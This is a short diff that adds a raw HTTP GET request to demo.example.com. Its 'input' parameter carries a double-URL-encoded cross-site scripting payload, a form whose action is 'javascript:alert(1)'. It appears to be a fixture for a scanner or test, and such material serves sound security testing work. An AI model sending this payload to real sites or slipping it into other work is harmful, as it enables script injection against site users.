@@ -1,0 +1,4 @@
+GET /a?input=%253Cform%2Baction%253D%2522javascript%253Aalert%25281%2529%2522%253E%253Cbutton%253Ex%253C%252Fbutton%253E%253C%252Fform%253E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
